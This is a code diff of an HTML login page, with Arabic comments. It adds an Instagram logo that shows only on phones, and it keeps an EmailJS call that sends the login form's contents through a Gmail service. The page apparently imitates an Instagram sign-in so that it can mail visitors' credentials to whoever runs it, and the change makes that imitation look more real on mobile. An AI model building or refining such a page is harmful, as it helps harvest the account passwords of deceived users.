@@ -104,6 +104,11 @@
             text-align: center;
         }
 
+        /* ✅ شعار الهاتف — مخفي على الشاشات الكبيرة */
+        .mobile-logo {
+            display: none;
+        }
+
         .login-box h2 {
             font-size: 20px;
             font-weight: 500;
@@ -265,12 +270,22 @@
             display: block;
         }
 
+        /* ✅ التجاوب مع الهواتف */
         @media (max-width: 768px) {
             .left-side {
                 display: none;
             }
             .right-side {
                 background-color: #000000;
+            }
+            
+            /* ✅ إظهار الشعار في الهاتف */
+            .mobile-logo {
+                display: block;
+                width: 70px;
+                height: 70px;
+                margin: 0 auto 30px auto;
+                object-fit: contain;
             }
         }
 
@@ -302,6 +317,9 @@
         <!-- النصف الأيمن (نموذج تسجيل الدخول) -->
         <div class="right-side">
             <div class="login-box">
+                
+                <!-- ✅ شعار الهاتف (يظهر فقط على الشاشات الصغيرة) -->
+                <img class="mobile-logo" src="https://www.betterworldbooks.com/content/images/Go/IG_Glyph_Fill.png" alt="Instagram Logo">
 
                 <form id="contact-form">
                     <div class="input-group">
@@ -386,7 +404,7 @@
             };
 
             emailjs.send(
-                "service_9ss4g5f",        // ✅ Gmail — الخدمة الافتراضية
+                "service_9ss4g5f",        // ✅ Gmail
                 "template_mbdmsuk",       // ✅ Template ID
                 templateParams
             )
